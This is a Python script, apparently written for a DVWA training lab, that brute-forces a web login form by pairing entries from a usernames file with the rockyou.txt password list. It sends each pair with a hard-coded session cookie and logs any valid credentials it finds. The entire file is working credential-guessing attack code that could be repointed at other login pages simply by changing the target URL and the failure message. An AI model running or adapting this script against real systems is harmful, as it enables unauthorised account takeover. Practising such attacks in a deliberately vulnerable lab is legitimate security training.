import requests
import logging  
import chardet

def read_file(file_path):
    def line_generator(file_path):
        with open(file_path, 'r', encoding='utf-8') as file:
            for line in file:
                yield line.strip()

    return line_generator(file_path)


def try_login(target, username, password, cookies):
    response = requests.get(target,params={"username": username, "password": password}, cookies=cookies)
    return "Username and/or password incorrect." not in response.text


def brute_force(target, usernames, passwords, cookies):
    for username in usernames:
        for password in passwords:
            logging.info(f"Trying username = {username} password = {password}")
            if try_login(target, username, password, cookies):
                logging.info(f"Found credentials: username = {username} password = {password}")
                return username, password
    return None, None

def main():
    logging.basicConfig(filename='app.log', filemode='w', format='%(name)s - %(levelname)s - %(message)s', level=logging.INFO)


    # usernameFilePath = "rockyou.txt"
    passwordFilePath = "rockyou.txt"
    usernameFilePath = "usernames.txt"
    # passwordFilePath = "passwords.txt"
    PHPSESSID = "b7484782a4776621097ca4a73daf1e62"
    security = "low"
    cookies = {"PHPSESSID": PHPSESSID, "security": security}
    target = "http://192.168.59.101/dvwa/vulnerabilities/brute/?username={username}&password={password}&Login=Login#"

    usernames = read_file(usernameFilePath)
    passwords = read_file(passwordFilePath)

    username, password = brute_force(target, usernames, passwords, cookies)
    if username and password:
        logging.info(f"Credentials found: {username}:{password}")
    else:
        logging.info("No valid credentials found.")

if __name__ == "__main__":
    main()